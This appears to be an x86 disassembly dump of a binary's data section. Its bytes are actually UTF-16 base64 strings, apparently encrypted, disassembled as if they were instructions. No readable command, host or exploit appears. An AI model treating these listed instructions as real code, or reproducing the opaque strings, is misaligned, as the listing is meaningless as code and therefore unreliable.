  40b196:	00 31                	add    %dh,(%ecx)
  40b198:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40b19c:	00 48 00             	add    %cl,0x0(%eax)
  40b19f:	42                   	inc    %edx
  40b1a0:	00 36                	add    %dh,(%esi)
  40b1a2:	00 50 00             	add    %dl,0x0(%eax)
  40b1a5:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40b1a9:	4f                   	dec    %edi
  40b1aa:	00 6a 00             	add    %ch,0x0(%edx)
  40b1ad:	6c                   	insb   (%dx),%es:(%edi)
  40b1ae:	00 6e 00             	add    %ch,0x0(%esi)
  40b1b1:	4a                   	dec    %edx
  40b1b2:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1b5:	77 00                	ja     0x40b1b7
  40b1b7:	4c                   	dec    %esp
  40b1b8:	00 6a 00             	add    %ch,0x0(%edx)
  40b1bb:	4b                   	dec    %ebx
  40b1bc:	00 6e 00             	add    %ch,0x0(%esi)
  40b1bf:	6d                   	insl   (%dx),%es:(%edi)
  40b1c0:	00 67 00             	add    %ah,0x0(%edi)
  40b1c3:	46                   	inc    %esi
  40b1c4:	00 65 00             	add    %ah,0x0(%ebp)
  40b1c7:	30 00                	xor    %al,(%eax)
  40b1c9:	79 00                	jns    0x40b1cb
  40b1cb:	45                   	inc    %ebp
  40b1cc:	00 63 00             	add    %ah,0x0(%ebx)
  40b1cf:	63 00                	arpl   %eax,(%eax)
  40b1d1:	69 00 4f 00 79 00    	imul   $0x79004f,(%eax),%eax
  40b1d7:	6d                   	insl   (%dx),%es:(%edi)
  40b1d8:	00 77 00             	add    %dh,0x0(%edi)
  40b1db:	45                   	inc    %ebp
  40b1dc:	00 4e 00             	add    %cl,0x0(%esi)
  40b1df:	58                   	pop    %eax
  40b1e0:	00 36                	add    %dh,(%esi)
  40b1e2:	00 46 00             	add    %al,0x0(%esi)
  40b1e5:	79 00                	jns    0x40b1e7
  40b1e7:	68 00 48 00 43       	push   $0x43004800
  40b1ec:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1ef:	56                   	push   %esi
  40b1f0:	00 47 00             	add    %al,0x0(%edi)
  40b1f3:	73 00                	jae    0x40b1f5
  40b1f5:	52                   	push   %edx
  40b1f6:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40b1fa:	00 52 00             	add    %dl,0x0(%edx)
  40b1fd:	41                   	inc    %ecx
  40b1fe:	00 42 00             	add    %al,0x0(%edx)
  40b201:	67 00 35             	add    %dh,(%di)
  40b204:	00 32                	add    %dh,(%edx)
  40b206:	00 6e 00             	add    %ch,0x0(%esi)
  40b209:	7a 00                	jp     0x40b20b
  40b20b:	4e                   	dec    %esi
  40b20c:	00 72 00             	add    %dh,0x0(%edx)
  40b20f:	7a 00                	jp     0x40b211
  40b211:	41                   	inc    %ecx
  40b212:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40b216:	00 6d 00             	add    %ch,0x0(%ebp)
  40b219:	31 00                	xor    %eax,(%eax)
  40b21b:	35 00 52 00 58       	xor    $0x58005200,%eax
  40b220:	00 53 00             	add    %dl,0x0(%ebx)
  40b223:	79 00                	jns    0x40b225
  40b225:	6d                   	insl   (%dx),%es:(%edi)
  40b226:	00 59 00             	add    %bl,0x0(%ecx)
  40b229:	7a 00                	jp     0x40b22b
  40b22b:	2b 00                	sub    (%eax),%eax
  40b22d:	47                   	inc    %edi
  40b22e:	00 2b                	add    %ch,(%ebx)
  40b230:	00 4b 00             	add    %cl,0x0(%ebx)
  40b233:	50                   	push   %eax
  40b234:	00 56 00             	add    %dl,0x0(%esi)
  40b237:	32 00                	xor    (%eax),%al
  40b239:	41                   	inc    %ecx
  40b23a:	00 51 00             	add    %dl,0x0(%ecx)
  40b23d:	62 00                	bound  %eax,(%eax)
  40b23f:	38 00                	cmp    %al,(%eax)
  40b241:	53                   	push   %ebx
  40b242:	00 55 00             	add    %dl,0x0(%ebp)
  40b245:	46                   	inc    %esi
  40b246:	00 55 00             	add    %dl,0x0(%ebp)
  40b249:	44                   	inc    %esp
  40b24a:	00 75 00             	add    %dh,0x0(%ebp)
  40b24d:	4d                   	dec    %ebp
  40b24e:	00 46 00             	add    %al,0x0(%esi)
  40b251:	35 00 78 00 62       	xor    $0x62007800,%eax
  40b256:	00 30                	add    %dh,(%eax)
  40b258:	00 75 00             	add    %dh,0x0(%ebp)
  40b25b:	5a                   	pop    %edx
  40b25c:	00 57 00             	add    %dl,0x0(%edi)
  40b25f:	61                   	popa
  40b260:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  40b264:	00 50 00             	add    %dl,0x0(%eax)
  40b267:	74 00                	je     0x40b269
  40b269:	6c                   	insb   (%dx),%es:(%edi)
  40b26a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b26d:	4c                   	dec    %esp
  40b26e:	00 45 00             	add    %al,0x0(%ebp)
  40b271:	74 00                	je     0x40b273
  40b273:	38 00                	cmp    %al,(%eax)
  40b275:	70 00                	jo     0x40b277
  40b277:	46                   	inc    %esi
  40b278:	00 65 00             	add    %ah,0x0(%ebp)
  40b27b:	72 00                	jb     0x40b27d
  40b27d:	37                   	aaa
  40b27e:	00 43 00             	add    %al,0x0(%ebx)
  40b281:	39 00                	cmp    %eax,(%eax)
  40b283:	6e                   	outsb  %ds:(%esi),(%dx)
  40b284:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40b288:	00 47 00             	add    %al,0x0(%edi)
  40b28b:	4f                   	dec    %edi
  40b28c:	00 4a 00             	add    %cl,0x0(%edx)
  40b28f:	74 00                	je     0x40b291
  40b291:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40b295:	71 00                	jno    0x40b297
  40b297:	55                   	push   %ebp
  40b298:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40b29c:	00 70 00             	add    %dh,0x0(%eax)
  40b29f:	46                   	inc    %esi
  40b2a0:	00 30                	add    %dh,(%eax)
  40b2a2:	00 35 00 51 00 42    	add    %dh,0x42005100
  40b2a8:	00 4f 00             	add    %cl,0x0(%edi)
  40b2ab:	31 00                	xor    %eax,(%eax)
  40b2ad:	41                   	inc    %ecx
  40b2ae:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40b2b2:	00 48 00             	add    %cl,0x0(%eax)
  40b2b5:	78 00                	js     0x40b2b7
  40b2b7:	56                   	push   %esi
  40b2b8:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  40b2bc:	00 2b                	add    %ch,(%ebx)
  40b2be:	00 47 00             	add    %al,0x0(%edi)
  40b2c1:	48                   	dec    %eax
  40b2c2:	00 41 00             	add    %al,0x0(%ecx)
  40b2c5:	4e                   	dec    %esi
  40b2c6:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40b2ca:	00 65 00             	add    %ah,0x0(%ebp)
  40b2cd:	79 00                	jns    0x40b2cf
  40b2cf:	72 00                	jb     0x40b2d1
  40b2d1:	75 00                	jne    0x40b2d3
  40b2d3:	57                   	push   %edi
  40b2d4:	00 5a 00             	add    %bl,0x0(%edx)
  40b2d7:	76 00                	jbe    0x40b2d9
  40b2d9:	67 00 47 00          	add    %al,0x0(%bx)
  40b2dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2de:	00 32                	add    %dh,(%edx)
  40b2e0:	00 55 00             	add    %dl,0x0(%ebp)
  40b2e3:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b2e7:	73 00                	jae    0x40b2e9
  40b2e9:	4f                   	dec    %edi
  40b2ea:	00 72 00             	add    %dh,0x0(%edx)
  40b2ed:	55                   	push   %ebp
  40b2ee:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40b2f2:	00 70 00             	add    %dh,0x0(%eax)
  40b2f5:	48                   	dec    %eax
  40b2f6:	00 4f 00             	add    %cl,0x0(%edi)
  40b2f9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2fa:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2fd:	4a                   	dec    %edx
  40b2fe:	00 48 00             	add    %cl,0x0(%eax)
  40b301:	4b                   	dec    %ebx
  40b302:	00 61 00             	add    %ah,0x0(%ecx)
  40b305:	4f                   	dec    %edi
  40b306:	00 79 00             	add    %bh,0x0(%ecx)
  40b309:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b30d:	56                   	push   %esi
  40b30e:	00 36                	add    %dh,(%esi)
  40b310:	00 65 00             	add    %ah,0x0(%ebp)
  40b313:	45                   	inc    %ebp
  40b314:	00 48 00             	add    %cl,0x0(%eax)
  40b317:	42                   	inc    %edx
  40b318:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40b31c:	00 54 00 34          	add    %dl,0x34(%eax,%eax,1)
  40b320:	00 2f                	add    %ch,(%edi)
  40b322:	00 4e 00             	add    %cl,0x0(%esi)
  40b325:	2f                   	das
  40b326:	00 51 00             	add    %dl,0x0(%ecx)
  40b329:	4a                   	dec    %edx
  40b32a:	00 79 00             	add    %bh,0x0(%ecx)
  40b32d:	49                   	dec    %ecx
  40b32e:	00 58 00             	add    %bl,0x0(%eax)
  40b331:	37                   	aaa
  40b332:	00 4f 00             	add    %cl,0x0(%edi)
  40b335:	4c                   	dec    %esp
  40b336:	00 2f                	add    %ch,(%edi)
  40b338:	00 52 00             	add    %dl,0x0(%edx)
  40b33b:	6c                   	insb   (%dx),%es:(%edi)
  40b33c:	00 58 00             	add    %bl,0x0(%eax)
  40b33f:	55                   	push   %ebp
  40b340:	00 79 00             	add    %bh,0x0(%ecx)
  40b343:	54                   	push   %esp
  40b344:	00 6a 00             	add    %ch,0x0(%edx)
  40b347:	53                   	push   %ebx
  40b348:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40b34c:	00 65 00             	add    %ah,0x0(%ebp)
  40b34f:	53                   	push   %ebx
  40b350:	00 4a 00             	add    %cl,0x0(%edx)
  40b353:	59                   	pop    %ecx
  40b354:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40b358:	00 4a 00             	add    %cl,0x0(%edx)
  40b35b:	63 00                	arpl   %eax,(%eax)
  40b35d:	43                   	inc    %ebx
  40b35e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b361:	76 00                	jbe    0x40b363
  40b363:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40b367:	45                   	inc    %ebp
  40b368:	00 59 00             	add    %bl,0x0(%ecx)
  40b36b:	39 00                	cmp    %eax,(%eax)
  40b36d:	38 00                	cmp    %al,(%eax)
  40b36f:	30 00                	xor    %al,(%eax)
  40b371:	39 00                	cmp    %eax,(%eax)
  40b373:	41                   	inc    %ecx
  40b374:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b377:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b37b:	4c                   	dec    %esp
  40b37c:	00 35 00 36 00 43    	add    %dh,0x43003600
  40b382:	00 4d 00             	add    %cl,0x0(%ebp)
  40b385:	2f                   	das
  40b386:	00 79 00             	add    %bh,0x0(%ecx)
  40b389:	73 00                	jae    0x40b38b
  40b38b:	37                   	aaa
  40b38c:	00 35 00 44 00 58    	add    %dh,0x58004400
  40b392:	00 4f 00             	add    %cl,0x0(%edi)
  40b395:	44                   	inc    %esp
  40b396:	00 37                	add    %dh,(%edi)
  40b398:	00 61 00             	add    %ah,0x0(%ecx)
  40b39b:	50                   	push   %eax
  40b39c:	00 33                	add    %dh,(%ebx)
  40b39e:	00 58 00             	add    %bl,0x0(%eax)
  40b3a1:	53                   	push   %ebx
  40b3a2:	00 31                	add    %dh,(%ecx)
  40b3a4:	00 76 00             	add    %dh,0x0(%esi)
  40b3a7:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40b3aa:	00 67 00             	add    %ah,0x0(%edi)
  40b3ad:	2f                   	das
  40b3ae:	00 4f 00             	add    %cl,0x0(%edi)
  40b3b1:	61                   	popa
  40b3b2:	00 43 00             	add    %al,0x0(%ebx)
  40b3b5:	2b 00                	sub    (%eax),%eax
  40b3b7:	77 00                	ja     0x40b3b9
  40b3b9:	2f                   	das
  40b3ba:	00 45 00             	add    %al,0x0(%ebp)
  40b3bd:	46                   	inc    %esi
  40b3be:	00 56 00             	add    %dl,0x0(%esi)
  40b3c1:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b3c5:	56                   	push   %esi
  40b3c6:	00 45 00             	add    %al,0x0(%ebp)
  40b3c9:	63 00                	arpl   %eax,(%eax)
  40b3cb:	62 00                	bound  %eax,(%eax)
  40b3cd:	75 00                	jne    0x40b3cf
  40b3cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3d0:	00 69 00             	add    %ch,0x0(%ecx)
  40b3d3:	62 00                	bound  %eax,(%eax)
  40b3d5:	79 00                	jns    0x40b3d7
  40b3d7:	7a 00                	jp     0x40b3d9
  40b3d9:	49                   	dec    %ecx
  40b3da:	00 65 00             	add    %ah,0x0(%ebp)
  40b3dd:	33 00                	xor    (%eax),%eax
  40b3df:	2b 00                	sub    (%eax),%eax
  40b3e1:	56                   	push   %esi
  40b3e2:	00 68 00             	add    %ch,0x0(%eax)
  40b3e5:	30 00                	xor    %al,(%eax)
  40b3e7:	32 00                	xor    (%eax),%al
  40b3e9:	4d                   	dec    %ebp
  40b3ea:	00 6a 00             	add    %ch,0x0(%edx)
  40b3ed:	73 00                	jae    0x40b3ef
  40b3ef:	43                   	inc    %ebx
  40b3f0:	00 7a 00             	add    %bh,0x0(%edx)
  40b3f3:	4a                   	dec    %edx
  40b3f4:	00 7a 00             	add    %bh,0x0(%edx)
  40b3f7:	57                   	push   %edi
  40b3f8:	00 46 00             	add    %al,0x0(%esi)
  40b3fb:	30 00                	xor    %al,(%eax)
  40b3fd:	44                   	inc    %esp
  40b3fe:	00 46 00             	add    %al,0x0(%esi)
  40b401:	7a 00                	jp     0x40b403
  40b403:	76 00                	jbe    0x40b405
  40b405:	71 00                	jno    0x40b407
  40b407:	54                   	push   %esp
  40b408:	00 59 00             	add    %bl,0x0(%ecx)
  40b40b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b40c:	00 36                	add    %dh,(%esi)
  40b40e:	00 56 00             	add    %dl,0x0(%esi)
  40b411:	44                   	inc    %esp
  40b412:	00 44 00 79          	add    %al,0x79(%eax,%eax,1)
  40b416:	00 75 00             	add    %dh,0x0(%ebp)
  40b419:	48                   	dec    %eax
  40b41a:	00 57 00             	add    %dl,0x0(%edi)
  40b41d:	4d                   	dec    %ebp
  40b41e:	00 4a 00             	add    %cl,0x0(%edx)
  40b421:	79 00                	jns    0x40b423
  40b423:	53                   	push   %ebx
  40b424:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b427:	73 00                	jae    0x40b429
  40b429:	62 00                	bound  %eax,(%eax)
  40b42b:	4f                   	dec    %edi
  40b42c:	00 67 00             	add    %ah,0x0(%edi)
  40b42f:	54                   	push   %esp
  40b430:	00 57 00             	add    %dl,0x0(%edi)
  40b433:	4c                   	dec    %esp
  40b434:	00 61 00             	add    %ah,0x0(%ecx)
  40b437:	52                   	push   %edx
  40b438:	00 67 00             	add    %ah,0x0(%edi)
  40b43b:	32 00                	xor    (%eax),%al
  40b43d:	50                   	push   %eax
  40b43e:	00 30                	add    %dh,(%eax)
  40b440:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  40b444:	00 31                	add    %dh,(%ecx)
  40b446:	00 53 00             	add    %dl,0x0(%ebx)
  40b449:	6a 00                	push   $0x0
  40b44b:	52                   	push   %edx
  40b44c:	00 6e 00             	add    %ch,0x0(%esi)
  40b44f:	6d                   	insl   (%dx),%es:(%edi)
  40b450:	00 77 00             	add    %dh,0x0(%edi)
  40b453:	4a                   	dec    %edx
  40b454:	00 42 00             	add    %al,0x0(%edx)
  40b457:	76 00                	jbe    0x40b459
  40b459:	39 00                	cmp    %eax,(%eax)
  40b45b:	77 00                	ja     0x40b45d
  40b45d:	41                   	inc    %ecx
  40b45e:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b464:	80 b1 4f 00 6c 00 33 	xorb   $0x33,0x6c004f(%ecx)
  40b46b:	00 30                	add    %dh,(%eax)
  40b46d:	00 68 00             	add    %ch,0x0(%eax)
  40b470:	62 00                	bound  %eax,(%eax)
  40b472:	46                   	inc    %esi
  40b473:	00 57 00             	add    %dl,0x0(%edi)
  40b476:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40b47a:	6d                   	insl   (%dx),%es:(%edi)
  40b47b:	00 6e 00             	add    %ch,0x0(%esi)
  40b47e:	4c                   	dec    %esp
  40b47f:	00 38                	add    %bh,(%eax)
  40b481:	00 67 00             	add    %ah,0x0(%edi)
  40b484:	4d                   	dec    %ebp
  40b485:	00 68 00             	add    %ch,0x0(%eax)
  40b488:	52                   	push   %edx
  40b489:	00 68 00             	add    %ch,0x0(%eax)
  40b48c:	70 00                	jo     0x40b48e
  40b48e:	46                   	inc    %esi
  40b48f:	00 52 00             	add    %dl,0x0(%edx)
  40b492:	2f                   	das
  40b493:	00 61 00             	add    %ah,0x0(%ecx)
  40b496:	63 00                	arpl   %eax,(%eax)
  40b498:	75 00                	jne    0x40b49a
  40b49a:	47                   	inc    %edi
  40b49b:	00 79 00             	add    %bh,0x0(%ecx)
  40b49e:	45                   	inc    %ebp
  40b49f:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4a2:	4f                   	dec    %edi
  40b4a3:	00 48 00             	add    %cl,0x0(%eax)
  40b4a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4a7:	00 4a 00             	add    %cl,0x0(%edx)
  40b4aa:	35 00 7a 00 67       	xor    $0x67007a00,%eax
  40b4af:	00 51 00             	add    %dl,0x0(%ecx)
  40b4b2:	74 00                	je     0x40b4b4
  40b4b4:	35 00 49 00 38       	xor    $0x38004900,%eax
  40b4b9:	00 45 00             	add    %al,0x0(%ebp)
  40b4bc:	54                   	push   %esp
  40b4bd:	00 75 00             	add    %dh,0x0(%ebp)
  40b4c0:	58                   	pop    %eax
  40b4c1:	00 30                	add    %dh,(%eax)
  40b4c3:	00 58 00             	add    %bl,0x0(%eax)
  40b4c6:	79 00                	jns    0x40b4c8
  40b4c8:	39 00                	cmp    %eax,(%eax)
  40b4ca:	33 00                	xor    (%eax),%eax
  40b4cc:	37                   	aaa
  40b4cd:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40b4d1:	00 52 00             	add    %dl,0x0(%edx)
  40b4d4:	63 00                	arpl   %eax,(%eax)
  40b4d6:	76 00                	jbe    0x40b4d8
  40b4d8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4d9:	00 46 00             	add    %al,0x0(%esi)
  40b4dc:	44                   	inc    %esp
  40b4dd:	00 53 00             	add    %dl,0x0(%ebx)
  40b4e0:	2f                   	das
  40b4e1:	00 75 00             	add    %dh,0x0(%ebp)
  40b4e4:	4b                   	dec    %ebx
  40b4e5:	00 2f                	add    %ch,(%edi)
  40b4e7:	00 63 00             	add    %ah,0x0(%ebx)
  40b4ea:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4eb:	00 57 00             	add    %dl,0x0(%edi)
  40b4ee:	2f                   	das
  40b4ef:	00 37                	add    %dh,(%edi)
  40b4f1:	00 33                	add    %dh,(%ebx)
  40b4f3:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40b4f7:	00 41 00             	add    %al,0x0(%ecx)
  40b4fa:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b4fe:	53                   	push   %ebx
  40b4ff:	00 65 00             	add    %ah,0x0(%ebp)
  40b502:	49                   	dec    %ecx
  40b503:	00 4d 00             	add    %cl,0x0(%ebp)
  40b506:	71 00                	jno    0x40b508
  40b508:	42                   	inc    %edx
  40b509:	00 33                	add    %dh,(%ebx)
  40b50b:	00 72 00             	add    %dh,0x0(%edx)
  40b50e:	55                   	push   %ebp
  40b50f:	00 77 00             	add    %dh,0x0(%edi)
  40b512:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b517:	80 b1 4f 00 77 00 53 	xorb   $0x53,0x77004f(%ecx)
  40b51e:	00 70 00             	add    %dh,0x0(%eax)
  40b521:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40b525:	31 00                	xor    %eax,(%eax)
  40b527:	4c                   	dec    %esp
  40b528:	00 76 00             	add    %dh,0x0(%esi)
  40b52b:	34 00                	xor    $0x0,%al
  40b52d:	48                   	dec    %eax
  40b52e:	00 65 00             	add    %ah,0x0(%ebp)
  40b531:	79 00                	jns    0x40b533
  40b533:	4f                   	dec    %edi
  40b534:	00 32                	add    %dh,(%edx)
  40b536:	00 7a 00             	add    %bh,0x0(%edx)
  40b539:	51                   	push   %ecx
  40b53a:	00 58 00             	add    %bl,0x0(%eax)
  40b53d:	5a                   	pop    %edx
  40b53e:	00 45 00             	add    %al,0x0(%ebp)
  40b541:	71 00                	jno    0x40b543
  40b543:	4e                   	dec    %esi
  40b544:	00 4e 00             	add    %cl,0x0(%esi)
  40b547:	44                   	inc    %esp
  40b548:	00 49 00             	add    %cl,0x0(%ecx)
  40b54b:	37                   	aaa
  40b54c:	00 36                	add    %dh,(%esi)
  40b54e:	00 70 00             	add    %dh,0x0(%eax)
  40b551:	48                   	dec    %eax
  40b552:	00 51 00             	add    %dl,0x0(%ecx)
  40b555:	52                   	push   %edx
  40b556:	00 59 00             	add    %bl,0x0(%ecx)
  40b559:	70 00                	jo     0x40b55b
  40b55b:	2f                   	das
  40b55c:	00 66 00             	add    %ah,0x0(%esi)
  40b55f:	30 00                	xor    %al,(%eax)
  40b561:	66 00 42 00          	data16 add %al,0x0(%edx)
  40b565:	34 00                	xor    $0x0,%al
  40b567:	44                   	inc    %esp
  40b568:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40b56c:	00 53 00             	add    %dl,0x0(%ebx)
  40b56f:	61                   	popa
  40b570:	00 6d 00             	add    %ch,0x0(%ebp)
  40b573:	53                   	push   %ebx
  40b574:	00 2b                	add    %ch,(%ebx)
  40b576:	00 37                	add    %dh,(%edi)
  40b578:	00 39                	add    %bh,(%ecx)
  40b57a:	00 43 00             	add    %al,0x0(%ebx)
  40b57d:	2f                   	das
  40b57e:	00 62 00             	add    %ah,0x0(%edx)
  40b581:	75 00                	jne    0x40b583
  40b583:	68 00 7a 00 35       	push   $0x35007a00
  40b588:	00 48 00             	add    %cl,0x0(%eax)
  40b58b:	48                   	dec    %eax
  40b58c:	00 57 00             	add    %dl,0x0(%edi)
  40b58f:	4e                   	dec    %esi
  40b590:	00 79 00             	add    %bh,0x0(%ecx)
  40b593:	71 00                	jno    0x40b595
  40b595:	4d                   	dec    %ebp
  40b596:	00 31                	add    %dh,(%ecx)
  40b598:	00 4e 00             	add    %cl,0x0(%esi)
  40b59b:	2f                   	das
  40b59c:	00 57 00             	add    %dl,0x0(%edi)
  40b59f:	43                   	inc    %ebx
  40b5a0:	00 52 00             	add    %dl,0x0(%edx)
  40b5a3:	73 00                	jae    0x40b5a5
  40b5a5:	42                   	inc    %edx
  40b5a6:	00 59 00             	add    %bl,0x0(%ecx)
  40b5a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5aa:	00 5a 00             	add    %bl,0x0(%edx)
  40b5ad:	2b 00                	sub    (%eax),%eax
  40b5af:	34 00                	xor    $0x0,%al
  40b5b1:	75 00                	jne    0x40b5b3
  40b5b3:	47                   	inc    %edi
  40b5b4:	00 56 00             	add    %dl,0x0(%esi)
  40b5b7:	6a 00                	push   $0x0
  40b5b9:	54                   	push   %esp
  40b5ba:	00 52 00             	add    %dl,0x0(%edx)
  40b5bd:	5a                   	pop    %edx
  40b5be:	00 59 00             	add    %bl,0x0(%ecx)
  40b5c1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5c2:	00 77 00             	add    %dh,0x0(%edi)
  40b5c5:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b5ca:	80 b1 42 00 38 00 71 	xorb   $0x71,0x380042(%ecx)
  40b5d1:	00 56 00             	add    %dl,0x0(%esi)
  40b5d4:	6a 00                	push   $0x0
  40b5d6:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5d7:	00 70 00             	add    %dh,0x0(%eax)
  40b5da:	62 00                	bound  %eax,(%eax)
  40b5dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5dd:	00 78 00             	add    %bh,0x0(%eax)
  40b5e0:	59                   	pop    %ecx
  40b5e1:	00 50 00             	add    %dl,0x0(%eax)
  40b5e4:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40b5e8:	35 00 67 00 4a       	xor    $0x4a006700,%eax
  40b5ed:	00 62 00             	add    %ah,0x0(%edx)
  40b5f0:	75 00                	jne    0x40b5f2
  40b5f2:	37                   	aaa
  40b5f3:	00 39                	add    %bh,(%ecx)
  40b5f5:	00 63 00             	add    %ah,0x0(%ebx)
  40b5f8:	76 00                	jbe    0x40b5fa
  40b5fa:	68 00 46 00 49       	push   $0x49004600
  40b5ff:	00 6f 00             	add    %ch,0x0(%edi)
  40b602:	70 00                	jo     0x40b604
  40b604:	69 00 78 00 78 00    	imul   $0x780078,(%eax),%eax
  40b60a:	62 00                	bound  %eax,(%eax)
  40b60c:	34 00                	xor    $0x0,%al
  40b60e:	76 00                	jbe    0x40b610
  40b610:	56                   	push   %esi
  40b611:	00 4b 00             	add    %cl,0x0(%ebx)
  40b614:	73 00                	jae    0x40b616
  40b616:	48                   	dec    %eax
  40b617:	00 31                	add    %dh,(%ecx)
  40b619:	00 42 00             	add    %al,0x0(%edx)
  40b61c:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40b620:	79 00                	jns    0x40b622
  40b622:	6e                   	outsb  %ds:(%esi),(%dx)
  40b623:	00 49 00             	add    %cl,0x0(%ecx)
  40b626:	61                   	popa
  40b627:	00 2b                	add    %ch,(%ebx)
  40b629:	00 36                	add    %dh,(%esi)
  40b62b:	00 41 00             	add    %al,0x0(%ecx)
  40b62e:	34 00                	xor    $0x0,%al
  40b630:	71 00                	jno    0x40b632
  40b632:	37                   	aaa
  40b633:	00 35 00 65 00 38    	add    %dh,0x38006500
  40b639:	00 4a 00             	add    %cl,0x0(%edx)
  40b63c:	74 00                	je     0x40b63e
  40b63e:	39 00                	cmp    %eax,(%eax)
  40b640:	57                   	push   %edi
  40b641:	00 53 00             	add    %dl,0x0(%ebx)
  40b644:	48                   	dec    %eax
  40b645:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b648:	7a 00                	jp     0x40b64a
  40b64a:	73 00                	jae    0x40b64c
  40b64c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b64d:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40b651:	00 35 00 52 00 48    	add    %dh,0x48005200
  40b657:	00 42 00             	add    %al,0x0(%edx)
  40b65a:	65 00 30             	add    %dh,%gs:(%eax)
  40b65d:	00 67 00             	add    %ah,0x0(%edi)
  40b660:	6e                   	outsb  %ds:(%esi),(%dx)
  40b661:	00 77 00             	add    %dh,0x0(%edi)
  40b664:	69 00 61 00 79 00    	imul   $0x790061,(%eax),%eax
  40b66a:	77 00                	ja     0x40b66c
  40b66c:	44                   	inc    %esp
  40b66d:	00 50 00             	add    %dl,0x0(%eax)
  40b670:	47                   	inc    %edi
  40b671:	00 31                	add    %dh,(%ecx)
  40b673:	00 61 00             	add    %ah,0x0(%ecx)
  40b676:	77 00                	ja     0x40b678
  40b678:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b67d:	03 33                	add    (%ebx),%esi
  40b67f:	00 00                	add    %al,(%eax)
  40b681:	80 b1 36 00 4a 00 68 	xorb   $0x68,0x4a0036(%ecx)
  40b688:	00 75 00             	add    %dh,0x0(%ebp)
  40b68b:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40b68f:	66 00 36             	data16 add %dh,(%esi)
  40b692:	00 7a 00             	add    %bh,0x0(%edx)
  40b695:	68 00 4f 00 44       	push   $0x44004f00
  40b69a:	00 58 00             	add    %bl,0x0(%eax)
  40b69d:	31 00                	xor    %eax,(%eax)
  40b69f:	5a                   	pop    %edx
  40b6a0:	00 31                	add    %dh,(%ecx)
  40b6a2:	00 78 00             	add    %bh,0x0(%eax)
  40b6a5:	55                   	push   %ebp
  40b6a6:	00 33                	add    %dh,(%ebx)
  40b6a8:	00 57 00             	add    %dl,0x0(%edi)
  40b6ab:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40b6af:	32 00                	xor    (%eax),%al
  40b6b1:	76 00                	jbe    0x40b6b3
  40b6b3:	2f                   	das
  40b6b4:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40b6b8:	00 72 00             	add    %dh,0x0(%edx)
  40b6bb:	4b                   	dec    %ebx
  40b6bc:	00 73 00             	add    %dh,0x0(%ebx)
  40b6bf:	4c                   	dec    %esp
  40b6c0:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40b6c4:	00 56 00             	add    %dl,0x0(%esi)
  40b6c7:	6a 00                	push   $0x0
  40b6c9:	32 00                	xor    (%eax),%al
  40b6cb:	38 00                	cmp    %al,(%eax)
  40b6cd:	64 00 39             	add    %bh,%fs:(%ecx)
  40b6d0:	00 38                	add    %bh,(%eax)
  40b6d2:	00 52 00             	add    %dl,0x0(%edx)
  40b6d5:	71 00                	jno    0x40b6d7
  40b6d7:	2f                   	das
  40b6d8:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  40b6dc:	00 49 00             	add    %cl,0x0(%ecx)
  40b6df:	77 00                	ja     0x40b6e1
  40b6e1:	2f                   	das
  40b6e2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b6e5:	4b                   	dec    %ebx
